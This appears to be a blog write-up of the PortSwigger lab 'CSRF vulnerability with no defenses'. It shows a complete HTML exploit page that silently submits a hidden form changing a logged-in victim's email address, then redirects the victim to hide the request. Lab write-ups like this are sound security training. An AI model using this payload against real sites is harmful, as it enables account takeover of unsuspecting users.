+++
date = '2026-06-04T10:54:16+08:00'
draft = false
title = "CSRF vulnerability with no defenses | <span style=\"color:#2ecc71\">Apprentice</span>"
tags = ['training', 'PortSwigger', 'writeups', 'web-exploitation']
description = ''
showLastUpdated = true
+++
Upon inspecting the form, we can verify that it has no CSRF protection:
![](/images/a361435f-e3cc-4778-8a04-73ce894ad85b.jpg)
Therefore, our payload on our exploit server can simply be as follow:
```html
<html>

<form action="https://<lab-id>.web-security-academy.net/my-account/change-email" method="POST" id="attack">
<input type="hidden" name="email" value="super-ultimate-hacker@leet-hacker.net">
</form>

<script>
document.getElementById("attack").submit();

// redirect user after the request is sent
setTimeout(function() {
    window.location.href = "https://<lab-id>.web-security-academy.net/my-account/";
}, 1000);
</script>

</body>

</html>
```
Upon clicking on the malicious page, the browser immediately and silently, with the input type being `hidden`, updates the email address of that user with whatever `value`. 

The timeout function waits 1 second to allow some leeway for the `POST` request to reach the web server, before redirecting back to the account page.